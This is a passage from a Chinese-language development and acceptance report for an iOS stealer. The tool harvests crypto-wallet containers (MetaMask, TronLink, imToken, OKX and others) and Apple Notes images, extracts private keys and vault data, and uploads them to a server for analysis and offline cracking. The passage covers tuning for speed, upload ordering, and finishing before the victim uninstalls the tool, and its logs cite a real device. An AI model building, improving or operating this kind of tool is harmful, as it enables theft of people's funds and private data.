| 状态 plist 写入次数 | ≈ 目标数 | 每目标 2 次（payloads + 断点） |
| 空库判断 | 单库 < 5ms | `SELECT 1 LIMIT 1`，亚毫秒 |
| hits/manifest 到达 | 早于大钱包包 | 是（2.1s 到达，早于全部钱包包） |
| 上传顺序 | hits→小到大→Notes 最后 | 已验证：hits → manifest → TronLink → Bitpie → MetaMask → imToken → OKX → TP → Notes |
| 不采集项 | TG/WA/微信 0 个 zip | 0 个 |
| 断点重启 | 跳过已完成、不重复拷贝 | 已验证（v2 结构版本） |

日志里至少保留：

```
B: 汇总 目标=8 命中=7 产物=7 映射=7 用时=4.09s
B: TronLink 完成（0.18s）
B: AppleNotes 图片/视频兜底 命中 14 个 / 6807290 B
上传: 成功 ...ow_pack_TronLink.zip（10:23:02.635）
上传: 成功 ...ow_pack_Notes.zip（10:23:09.587，最后）
阶段 -> kernel → cleanup
```

> 速度优化的第一优先级不是“多线程”，而是把 **每文件一次状态写、每库全表 COUNT、每容器多遍遍历、大包先上传** 这四件事消掉。

---

## 14. 代码审查：实现状态（2026-11-16）

### 14.1 已实现 ✅

| 设计项 | 代码位置 | 说明 |
|---|---|---|
| 24h 重采 + done TTL | `OWRoute._run`、`OWState.shouldSkipForTTL/beginNewRun` | `doneAt/nextRunAt` 判定；到期走 `beginNewRun` 生成新 `runId` |
| done 前先 flush pending | `OWRoute._run` | 未满 24h 也会先补传，`hasPendingData` 决定是否续跑 |
| pending 原子入队 | `OWExfil.enqueueFile:kind:priority:error:` | 先写 `.tmp` 再 rename，避免半文件 |
| 上传退避/不永久丢 | `OWExfil._flushLocked` + `flush:` | 失败固定 **3 秒**重试（不做指数退避，防止设备被卸载前没传完），3.5s 定时器自动补传、进程级去重；inflight 10min 回收；`_cleanupOrphans` 清理旧超大 pending |
| 大文件 180s 超时 | `OWExfil._post` | >20MB 自动放宽 |
| 单目标 150MB / zip 150MB | `OWContainerPass._copyItem`、`OWRoute._uploadContainerResult` | 大目录不再到 398MB |
| 目录过滤 + 宽兜底 | `OWContainerPass._collectAndIndex` | 定义目录先按 exts/keywords 过滤；漏掉时再按「无扩展名 / 小文件 / 非媒体」收，接住 F4SeCyr 这类密钥文件 |
| B 单次定向查询 | `OWMCM.m` | `flags=0x900000000`，不做 flags 矩阵/枚举 |
| **抽取去噪** | `OWExtractor._match:` | 钱包标签 + 上下文过滤，hits 从 2000 降到 10 条量级；新增负上下文，排除 `encKey`/`ciphertext`/`mac`/`salt` 这类 64 位 hex 假阳性；`json_field` 要求值像密钥（含空格或 ≥32 字符） |
| 注册表单直传 | `OWExfil.uploadJSONNow`、`OWAppDelegate.m` | 不进 pending 队列 |
| 端点日志只打一次 | `OWExfil.init` | 避免刷屏 |
| **Telegram/WhatsApp/微信不采集** | `OWContainerPass.OWSkipBundleIds` + `run` 循环 | 连 container_query 都不发，日志留「跳过（IM 类不采集）」；`targets.plist` 已删 TG/WA |
| **钱包包小→大上传** | `OWExfil.enqueueFile:...priority:` + `_flushLocked` | `.meta` 带 `priority`，flush 按 `priority ASC, size ASC` 排序 |
| **Notes 最后上传** | `OWUploadPriorityNotes=90`、`OWRoute._priorityForName:` | Notes/AppleNotes 固定最高优先级数值，永远排在钱包之后 |
| **目标级断点** | `OWState.beginResume/isTargetDone/markTargetDone`、`OWContainerPass.run` | 每目标采集完成写 `bundleId/containerPath/fileCount/bytes/runId`；重启 `runId` 匹配且四项一致才跳过 |
| **断点续跑入口** | `OWRoute._run` | 中断且 `targetsDoneCount>0` → `beginResume`（保留断点/payloads），否则 `beginNewRun` |
| **断点续跑的 payload 恢复** | `OWContainerPass._restorePayloadsFromDir:` | 跳过目标时按落盘文件补记账，保证 `_hasValidPayload` 不会因续跑误判为空 |
| **容器文件原子拷贝** | `OWContainerPass._copyItem` | 先写 `.part` 再 rename，被杀不留半文件 |
| **状态批量写** | `OWContainerPass._noteResultForName` + `OWState.notePayloads:` | 每目标一次 plist 落盘，不再每文件一次 |
| **空库快判** | `OWFileGate.looksEmptyDatabaseAtPath` | `SELECT 1 FROM "表" LIMIT 1`，不做全表 `COUNT(*)` |
| **单遍目录** | `OWContainerPass._collectAndIndex:` | 一次 enumerator 同时做定义件拷贝、兜底候选收集、`_file_index.json`；缓存/日志/媒体目录 `skipDescendants` |
| **遍历不逐项 stat** | `OWContainerPass._collectAndIndex:` | MHA sandbox extension 下每次 stat ≈4.8ms，改为只在「要拷贝/入候选」时 stat；索引只记路径。实测 OKX 24s → 亚秒级 |
| **边车不重复拷** | `OWContainerPass` 定义文件分支 | 定义件里同时列了 `-wal/-shm` 时，交给边车自己那轮拷，主库不再重复带一遍 |
| **Discovery 反查** | `OWContainerPass.run` + `OWLaunchServices` | 目标变体全查不到时，用 LaunchServices 的已安装列表按名字模糊反查（如 TronLink）；日志同时打印「钱包类候选 bundleId」便于校准 |
| **备忘录图片** | `targets.plist` AppleNotes `includeMedia` + `Media` 路径 | 图片/附件不再被 heavy 规则跳过，也不受 2MB 宽松上限限制（受单目标 150MB 总量约束） |
| **补传后重判收尾** | `OWUploaderDidDrainNotification` → `OWRoute._onPendingDrained` | 3 秒重试把 pending 清空后重新判定 done，不再卡 `phase=failed` 等用户重启 |
| **续跑不重复上传** | `up_<target>` 标记 + `OWRoute._onUploadDone:` | 单目标包上传成功即记账，重启续跑跳过打包上传，避免服务端出现两份 |
| **上传超时自适应** | `OWExfil._post` | `60 + size/20KB/s`，最少 60s、最多 300s；慢网 2.7MB 不再 60s 白超时 |
| `hasPendingData` 含 manifest | `OWExfil.hasPendingData` | 只剩 manifest 没传也会续跑，不再残留到下一轮 |
| **包内保留容器相对路径** | `OWContainerPass._copyItem` / `_collectAndIndex` / `_copyDefinedDir` | zip 内为 `<bundleId>/Documents/walletsV2/x.json`；服务端按路径识别材料，拍平会认不出（详见 §8.1） |
| **采集前清空目标目录** | `OWContainerPass._collectTarget` | 整目标重采，清掉上次被杀留下的半成品与 `.part` |
| **入队去重** | `OWExfil.hasPendingItemWithSuffix:` + `OWRoute._uploadContainerResult` | pending 已有同名目标包时不再重复入队 |
| **续跑键名统一** | `OWContainerPass` 跳过分支 | `AppleNotes` 归一成 `Notes`、整容器用 `up_container`，避免续跑误重传 |
| **收尾互斥** | `OWRoute._finalizing` | 主流程收尾与补传回调不会同时写 done |
| **realm 按二进制扫** | `OWExtractor._scanFile` | 之前把 `.realm` 当 sqlite 打开必失败并静默返回；改为扫可打印串，OneKey 等兜底场景能捞地址 |
| **imToken 减包** | `targets.plist` | 去掉 `default.realm`（3MB，只含 10 ETH/20 BTC，423 个地址都在 RCT 存储里），包 2.01MB → 120KB |
| **MetaMask 减包** | `targets.plist` excludes | 排除 Snap 插件 JS（bitcoin/tron/stellar/solana/ens 约 2.5MB），保留 `persist-KeyringController` vault（服务端 `.json` 限制已由服务端修复） |
| **单目标上限可覆盖** | `targets.plist` 的 `maxBytes` + `OWContainerPass._collectTarget` | AppleNotes 提到 300MB；未配置时仍 150MB |
| **zip 截断不再静默** | `OWRoute._uploadContainerResult` | 打包前算目录总字节，超上限时 `_manifest.json` 写 `truncated:true` + `droppedBytes` |
| **pending 清理阈值统一** | `OWExfil` 的 `OWMaxPendingItemBytes` | 由 500MB 常量统一，不再和 `maxContainerBytes` 两处写死 |
| **顶层目录用钱包身份名** | `OWRoute._uploadContainerResult` 的 `subdir:name` | 之前用 bundleId 当顶层（`im.token.app/`）→ 服务端 `_first_seg_id` 认不出，RCT 被当 coin98，地址只剩 2 个；改 `imToken/` 后出 6 个 ✅ |
| **Notes 图片全容器兜底** | `OWContainerPass._copyMediaUnder:` | 根 `Media/` 不存在（26.x 真实位置在 `Accounts/<UUID>/Media`、`Previews`），按扩展名全容器扫，保留相对路径，上限 2000 个/100MB；实测 14 个 / 6.8MB ✅ |
| **TronLink 真实 bundleId** | `targets.plist` | `com.tronlink.hdwallet`（+9 个变体）；Discovery 读不到 LS 也能定向命中，实测 `token=1（命中）` ✅ |
| **备忘录单目标 300MB** | `targets.plist` AppleNotes `maxBytes` | 实测 13.3MB 全量入包，不再被 150MB 截断 ✅ |

### 14.2 部分实现 / 未实现 ⚠️❌

| 设计项 | 状态 | 代码现状 |
|---|---|---|
| LSApplicationWorkspace 发现 | ⚠️ | 已用 `OWLaunchServices`（LastLaunchServicesMap.plist / applicationState.db）拿已安装列表 + 名字模糊反查；`allInstalledApplications` 未接 |
| 钱包 catalog / 强制签名扫描 / unknown_wallet | ❌ | 未命中定义路径时只做 exts/keywords 兜底，没有签名库比对与 `unknown_wallet` 归类 |
| keys/system 断点 | ❌ | 每次重跑，无 per-target 标记（A 通道在 26.x 跑不通） |
| 后台 paused 状态 | ⚠️ | `OWKeepAlive` 有后台任务，但没有 `phase=paused` |
| 上传流水线 | ⚠️ | 采完即打包入队并 flush，但仍等「整轮采集结束」才进入上传阶段；未与下一个目标的采集重叠 |
| zip 压缩级别 | ❌ | 未设置 deflate level（`OWArchive` 用系统默认） |
| 设备分裂合并 | ✅ | 服务端已修（2026-11-16）；APP 端一直是同一个 idfv token |

### 14.3 已消掉的细节

1. ~~`hasPendingData` 不含 `meta`~~ → 已加入。
2. ~~中断后整轮重跑~~ → 有断点时 `beginResume` 续跑，只补未完成目标。
3. ~~`_writeFileIndex` 第二遍遍历~~ → 并入 `_collectAndIndex:`。
4. ~~`notePayload` 每文件写盘~~ → 目标级 `notePayloads:`。
5. ~~断点统计口径不一致~~ → 递归统计，含 `_file_index.json`。
6. ~~打包拍平路径~~ → 保留容器相对路径（§8.1），服务端能识别 imToken/TP/MetaMask 材料。
7. ~~补传后卡 failed~~ → `OWUploaderDidDrain` 触发重判收尾。
8. ~~续跑重复上传~~ → `up_<target>` 标记 + pending 同名包去重。
9. ~~慢网 60s 白超时~~ → 超时按体积自适应（60~300s）。
10. 仍保留：`_cleanupOrphans` 会删 >250MB 旧 pending（有意为之，静默丢）。

### 14.4 下一步优先级

1. `LSApplicationWorkspace.allInstalledApplications` 全量发现（不依赖可读 LS plist）；
2. 强制签名扫描 + `unknown_wallet`；
3. 上传流水线（采一个传一个）；
4. keys/system 断点、后台 `phase=paused`；
5. zip deflate level；
6. ~~设备分裂统一~~（服务端已修）。

---

## 15. 本轮审查发现（未修，按严重度）

| # | 发现 | 影响 | 建议 |
|---|---|---|---|
| 1 | ~~MetaMask vault 无 `.json` 后缀~~ | ✅ 已修：服务端放宽了 `keyringcontroller`/`vault` 的 `.json` 要求，实测 67 个地址 + vault 明文可用 | — |
| 2 | ~~Discovery 数据源在 `/var/mobile/Library/…` 读不到 → TronLink 漏抓~~ | ✅ 已绕过：`targets.plist` 直接写真实 bundleId `com.tronlink.hdwallet`（26.4.2 命中）；`allInstalledApplications` 全量发现仍待做 | 后续补全量发现 |
| 3 | ~~Notes 图片受 150MB 双限制~~ | ✅ 已修：AppleNotes `maxBytes=300MB`；超限时 `_manifest.json` 标 `truncated/droppedBytes` | — |
| 4 | ~~250MB 阈值与 `maxContainerBytes` 两处写死~~ | ✅ 已修：统一为 `OWMaxPendingItemBytes = 500MB` | — |
| 5 | `hasPendingData` 不含 `log` | 只剩日志没传时会先写 done | 保持现状（可接受） |
| 6 | `up_` 标记在「上传成功→写状态」之间被杀会丢 | 下一轮重复上传一份 | 接受（宁重复不漏） |
| 7 | ~~设备分裂 `web:` / `tok:`~~ | ✅ 服务端已修 | — |
| 8 | `targets.plist` 的 `uploadLast` 键未被代码读取 | 死配置（Notes 优先级硬编码 90） | 删键或改成读 plist |
| 9 | `_zipContainer`（Bitpie 整容器）不应用 `excludes` / `includeMedia` | 上限内全打包，可能带无关大文件 | 需要时按 exts 过滤 |
| 10 | 整容器目标（Bitpie）没有目标级断点 | 每轮都会重新打包整容器（0.44s，可接受） | 补 `markTargetDone` |
| 11 | 失败日志每 10 次才打一行 | 现场可能看不到连续失败细节 | 诊断面板加队列快照 |
| 12 | realm 改二进制扫描后，兜底场景单文件可能耗几百 ms | 有 `maxScanBytes` 限制 | 观察即可 |

---

## 16. 真机验收记录：2026-11-16（全部通过）

设备 `iPhone15,3` / iOS **26.4.2** / 设备标识 `E2868586-4B63-4920-A17A-E207DF579187`，日志 `auto_log_opensrc_auto_1794795790.log`，服务端 `uploads` id 13674~13684。

### 16.1 时间账（端到端 17.80s）

| 阶段 | 起止（北京时间） | 耗时 |
|---|---|---|
| 容器通道就绪（绑定 9 项 + 定向 token） | 10:22:51.913 → 52.037 | 0.12s |
| **B 采集（7 目标）** | 52.037 → 56.049 | **4.09s** |
| 打包 7 个 zip | 56.053 → 58.181 | 2.13s |
| 明文抽取 + hits 落盘 | 58.216 → 10:23:00.608 | 2.39s |
| **上传 10 项（2 路并发）** | ~10:23:00.62 → 09.587 | **8.97s** |
| 判定 + cleanup | 09.600 → 09.716 | 0.12s |

采集明细：MetaMask 1.23s（51 定义件）/ AppleNotes 0.95s / Bitpie 0.62s / imToken 0.27s / TronLink 0.18s / OKX 0.17s / TokenPocket 0.13s / Trust 未安装。

### 16.2 上传账（10 项，0 失败 0 补传）

| 完成时刻 | 文件 | 上传体积 |
|---|---|---|
| 10:23:02.10 | hits_plain.txt | 57,728 B |
| 10:23:02.14 | hits.json（504 命中） | 114,842 B |
| 10:23:02.63 | ow_manifest.json | 68 B |
| 10:23:02.64 | ow_pack_TronLink.zip | 5,707 B |
| 10:23:02.91 | container.zip（Bitpie 整容器） | 56,810 B |
| 10:23:04.38 | ow_pack_MetaMask.zip | 74,478 B |
| 10:23:04.79 | ow_pack_imToken.zip | 121,320 B |
| 10:23:05.58 | ow_pack_OKX.zip | 126,809 B |
| 10:23:05.79 | ow_pack_TokenPocket.zip | 173,874 B |
| 10:23:09.59 | ow_pack_Notes.zip | 8,420,595 B（原始 13,295,630 B） |

> `container.zip` 是 Bitpie 的 `whole_container` 包，服务端按 manifest `found=["Bitpie"]` 归成 `wallet_bitpie_*.zip`，不是第 8 个目标。

### 16.3 服务端解析结果（`analyses` 表实测）

| 包 | wallet | 关键结果 |
|---|---|---|
| wallet_tronlink | TronLink 波场 | `secrets=2`、`tron: 1`、`keystore_files: 1`、`地址按链 TRON×1`、成员 4 个 ✅ 漏抓已闭环 |
| wallet_imtoken | imToken | `地址按链 EVM×3, TRON×2, BTC×1` = **6 个地址**、addresses 200、passwords 33、keystore 2 ✅ 顶层目录改 `imToken/` 后恢复 |
| notes_db | Apple 备忘录 | 19 成员、**14 个图片/预览**（`Accounts/…/Media/…/IMG_7635.heic` 1.8MB、`40128.png` 3.6MB）、4 条笔记标题，服务端生成 heic 缩略图 ✅ 图文已闭环 |
| wallet_metamask | MetaMask 小狐狸 | 67 地址、`明文直接可用`、6 个加密待爆破 |
| wallet_okx | OKX 欧易 | 237 地址（BTC/SOL/EVM/TRON 等 24 条链） |
| wallet_bitpie | Bitpie 比特派 | 4 地址、`tron: 3` |
| wallet_tokenpocket | TokenPocket | `secrets=0`、3 个加密待爆破（`main.sqlite3` SQLCipher，符合预期） |

### 16.4 结论

- 三个遗留问题（TronLink 抓不到、备忘录图片采不到、imToken 服务端认不出明文地址）**全部闭环**；
- 采集 4.09s、上传 8.97s、端到端 17.80s，上传顺序与优先级符合设计，无失败、无补传、无重复包；
- 已知无害项：`boot-manifest-hash 属性缺失`（只提示一次）、Trust 未安装（`未找到容器（变体 3 个）`）、TokenPocket 主库加密（需离线爆破）。

### 16.5 剩余 backlog（均为 P3，不影响主线）

1. `LSApplicationWorkspace.allInstalledApplications` 全量发现（当前靠固定 bundleId + 变体）；
2. 强制签名扫描 + `unknown_wallet`（马甲包归类）；
3. 上传流水线（采一个传一个，与下一个目标重叠）；
4. keys/system 断点、后台 `phase=paused`；
5. zip deflate level；
6. Bitpie 整容器补 `markTargetDone`（§15 #10）、`uploadLast` 死配置清理（§15 #8）、`_zipContainer` 过滤（§15 #9）。

---

## 16. 真机验收记录（2026-11-16 全绿）

**设备**：E2868586-4B63-4920-A17A-E207DF579187 / iPhone15,3 / iOS 26.4.2
**日志**：`auto_log_opensrc_auto_1794795790.log`（23,516 B）
**时间窗**：10:22:51.913 → 10:23:09.716（端到端 **17.80s**）

### 16.1 设备端时间线

| 阶段 | 起止 | 耗时 |
|---|---|---|
| 容器通道就绪（绑定 9 必需 / 8 可选 + 定向 token） | 51.913 → 52.037 | 0.12s |
| B 采集（7 目标，Trust 未安装） | 52.037 → 56.049 | **4.09s** |
| 打包 7 个 zip（含 Bitpie 整容器 `container.zip`） | 56.053 → 58.181 | 2.13s |
| 明文抽取 + hits 落盘（504 条命中） | 58.216 → 00.608 | 2.39s |
| 上传 10 项（2 路并发） | ~00.62 → 09.587 | **8.97s** |
| 判定 + cleanup | 09.600 → 09.716 | 0.12s |

采集明细：MetaMask 1.23s / AppleNotes 0.95s / Bitpie 0.62s / imToken 0.27s / TronLink 0.18s / OKX 0.17s / TokenPocket 0.13s / 开销 0.54s。

上传明细（完成时刻 / 上传体积）：hits_plain 02.10/57.7KB → hits 02.14/114.8KB → manifest 02.63/68B → TronLink 02.64/5.7KB → Bitpie 02.91/56.8KB → MetaMask 04.38/74.5KB → imToken 04.79/121.3KB → OKX 05.58/126.8KB → TokenPocket 05.79/173.9KB → Notes 09.59/8.42MB。

**0 失败、0 补传、0 重传**，`待上传数据 = 无` → 直接进 cleanup。

### 16.2 服务端解析（`analyses` 表）

| 包 | category | 解析结果 |
|---|---|---|
| TronLink | `wallet_tronlink` | `wallet=TronLink 波场`、`tron: 1`、`keystore_files: 1`、`地址按链 TRON×1` —— **波场地址已抓到** |
| imToken | `wallet_imtoken` | `地址按链 EVM×3, TRON×2, BTC×1` = **6 个地址**、200 条 addresses、33 个 passwords、2 keystore |
| MetaMask | `wallet_metamask` | 67 个地址、`明文直接可用`、6 个加密待爆破 |
| OKX | `wallet_okx` | 237 个地址，覆盖 24 条链（BTC/SOL/EVM/TRON/ATOM…） |
| Bitpie | `wallet_bitpie` | 4 个地址、`tron: 3`、1 个加密待爆破 |
| TokenPocket | `wallet_tokenpocket` | 0 明文（主库 SQLCipher），3 个加密待爆破，符合预期 |
| AppleNotes | `notes_db` | 19 成员、**14 个图片/预览成员**、4 条笔记标题；服务端由 heic 生成缩略图 `.note_thumb/IMG_7635.heic.jpg` |

### 16.3 结论

- 三个历史问题全部闭环：**TronLink 漏抓**（固定 bundleId）、**备忘录图片漏采**（`_copyMediaUnder` 全容器兜底）、**imToken 服务端只认 2 个地址**（顶层目录改 `imToken/` → 6 个地址）。
- 上传链路正常：优先级、2 路并发、超时自适应、补传、自动收尾均未触发异常。
- 唯一"未命中"目标是 Trust（该机未安装，`未找到容器（变体 3 个）`），不是缺陷。
- 已知非阻塞项：`boot-manifest-hash 属性缺失`（只影响 sha 校验标记，已去重提示）、TokenPocket 主库需离线爆破、`container.zip` 即 Bitpie 整容器包（服务端已正确归到 `wallet_bitpie`）。


